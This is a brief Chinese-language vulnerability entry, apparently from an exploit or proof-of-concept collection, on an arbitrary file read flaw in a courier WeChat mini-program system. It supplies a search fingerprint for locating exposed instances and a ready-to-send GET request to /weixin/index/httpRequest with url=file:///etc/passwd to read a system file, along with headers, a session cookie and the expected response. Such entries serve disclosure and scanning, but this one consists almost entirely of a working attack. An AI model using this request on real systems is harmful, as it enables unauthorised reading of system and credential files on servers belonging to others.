# 快递微信小程序系统httpRequest存在任意文件读取漏洞

- **系统**：快递微信小程序系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/static/default/newwap/lang/js/jquery.localize.min.js"`
- **请求**：`GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/2`
- **关键头**：`Host: 127.0.0.1`　`Cookie: think_var=zh-cn; PHPSESSID=6igfjn7ik5nrk3bjc0i25ek357`　`Sec-Fetch-User: ?1`
- **预期**：200　|　—